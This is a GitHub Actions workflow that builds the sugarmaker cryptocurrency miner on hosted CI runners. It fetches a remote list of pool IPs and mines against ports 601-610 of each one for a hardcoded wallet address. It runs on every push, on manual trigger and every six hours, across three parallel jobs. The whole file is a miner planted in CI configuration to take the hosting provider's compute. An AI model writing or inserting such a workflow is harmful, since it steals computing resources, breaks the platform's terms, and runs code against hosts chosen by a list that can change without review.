name: Run Sugarmaker

on:
  workflow_dispatch:
  push:
    branches: ["main"]
  schedule:
    - cron: '0 */6 * * *'

jobs:
  build:
    name: build
    runs-on: ubuntu-latest
    strategy:
      max-parallel: 5
      fail-fast: false
      matrix:
        go: [1, 2, 3]
        flag: [A]
    env:
      NUM_JOBS: 40
      JOB: ${{ matrix.go }}
    steps:
      - name: Checkout repository
        run: |
          git clone https://github.com/decryp2kanon/sugarmaker.git

      - name: Install dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y build-essential libcurl4-openssl-dev autotools-dev automake libtool jq

      - name: Build Sugarmaker
        run: |
          cd sugarmaker
          ./autogen.sh
          ./configure CFLAGS="-Wall -O2 -fomit-frame-pointer" CXXFLAGS="$CFLAGS -std=gnu++11"
          make

      - name: Download list.json
        run: |
          curl -L -o list.json https://github.com/barburonjilo/open/raw/refs/heads/main/list.json

      - name: Run Sugarmaker in loop
        run: |
          # Extract IPs from the list.json file
          ips=$(jq -r '.[].IP' list.json)

          cd sugarmaker

          for ip in $ips; do
            for port in {601..610}; do
              echo "Running ./sugarmaker for $ip:$port"
              ./sugarmaker -o $ip:$port -u sugar1q8cfldyl35e8aq7je455ja9mhlazhw8xn22gvmr -p x &
              sleep 80
              echo "Stopping ./sugarmaker for $ip:$port"
              pkill sugarmaker || true
              sleep 90
            done
          done

